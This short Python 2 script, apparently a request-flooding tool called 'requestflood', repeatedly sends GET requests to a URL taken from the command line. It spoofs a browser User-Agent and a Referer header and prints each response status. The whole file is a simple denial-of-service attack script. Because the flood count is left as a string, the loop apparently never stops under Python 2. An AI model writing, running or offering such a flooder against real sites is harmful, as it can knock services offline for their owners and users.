#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests as request
import sys

class Requester:

	def __init__(self, flood_max, url):

		count = 0
		headers = {"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 GTB7.1 (.NET CLR 3.5.30729)", "Referer": "http://example.com"}

		while count < flood_max:
			r = request.get(url, headers=headers)
			print '%s - %s - %s - %s' % (r.status_code, r.url, r.json, count)
			count += 1


requestflood = Requester(sys.argv[1], sys.argv[2])